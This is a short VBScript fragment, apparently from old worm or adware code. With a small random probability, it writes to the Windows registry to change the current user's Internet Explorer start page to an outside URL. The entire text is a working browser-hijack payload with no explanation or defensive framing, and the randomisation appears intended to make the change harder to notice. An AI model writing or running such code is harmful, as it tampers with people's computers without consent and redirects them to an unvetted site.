if rnd*100<8 then
Set W = Wscript.CreateObject("Wscript.Shell")
W.RegWrite "HKCU\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page","http://www.free-gall.com/h.php"
end if
